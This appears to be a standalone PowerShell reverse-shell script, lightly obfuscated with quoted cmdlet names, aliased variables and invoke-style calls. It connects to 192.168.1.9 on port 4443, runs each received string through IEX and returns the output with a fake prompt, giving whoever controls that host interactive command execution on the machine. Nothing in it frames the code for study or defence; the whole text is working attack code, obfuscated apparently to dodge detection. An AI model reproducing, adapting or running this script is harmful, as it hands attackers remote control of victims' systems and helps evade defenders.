sv ('8mxcp')  ([type]("text.encoding") ) ;
${client} = &("New-Object") ("System.Net.Sockets.TCPClient") (('192.168.1.9'), 4443);

${stream} = ${client}.("GetStream").Invoke();

[byte[]]${bytes} = 0..65535|.('%'){0};

while((${i} = ${stream}.("Read").Invoke(${bytes}, 0, ${bytes}."length")) -ne 0) {
    ${data} = (.("New-Object") -TypeName ("System.Text.ASCIIEncoding"))."getString"(${bytes}, 0, ${i});
    ${sendback} = (.("IEX") ${data} 2>&1 | &("Out-String") );
    ${sendback2} = ${sendback} + "PS " + (.("pwd"))."PATH" + "> ";
    ${sendbyte} = (  (  variable ('8MXCP')  -value  )::"ascii").("GetBytes").Invoke(${sendback2});
    ${stream}.("Write").Invoke(${sendbyte}, 0, ${sendbyte}."length");
    ${stream}.("Flush").Invoke()
}

${client}.("Close").Invoke();
